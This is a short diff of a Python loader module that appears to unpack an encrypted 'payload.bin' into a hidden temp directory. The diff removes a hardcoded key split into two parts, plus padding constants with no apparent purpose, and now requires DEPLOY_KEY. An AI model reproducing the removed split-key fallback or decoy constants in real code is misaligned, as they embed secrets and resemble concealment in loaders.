@@ -3,24 +3,14 @@
 """
 import base64, hashlib, io, os, sys, tarfile, tempfile
 
-APP_DIR = os.path.join(tempfile.gettempdir(), ".rt-cache-58146d17")
+APP_DIR = os.path.join(tempfile.gettempdir(), ".rt-cache-fbfe9b9b")
 PAYLOAD = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payload.bin")
 
-_K_PART_A = "5ddaf5a8e9e2f069a9df19b8b27b7a6c"
-_K_PART_B = "c5a774e1176d4375e5e81dedca5740f3"
-DEFAULT_TIMEOUT_20 = 2544
-POOL_SIZE_48 = 693
-WORKER_COUNT_80 = 1086
-MAX_BUFFER_56 = 2337
-WORKER_COUNT_74 = 1354
-DEFAULT_TIMEOUT_23 = 278
-
 def _key():
-    import os as _o
-    env_key = _o.environ.get("DEPLOY_KEY", "")
-    if env_key:
-        return bytes.fromhex(env_key)
-    return bytes.fromhex(_K_PART_A + _K_PART_B)
+    env_key = os.environ.get("DEPLOY_KEY", "")
+    if not env_key:
+        raise SystemExit("DEPLOY_KEY is not set")
+    return bytes.fromhex(env_key)
 
 def _payload_hash():
     return hashlib.sha256(open(PAYLOAD, "rb").read()).hexdigest()
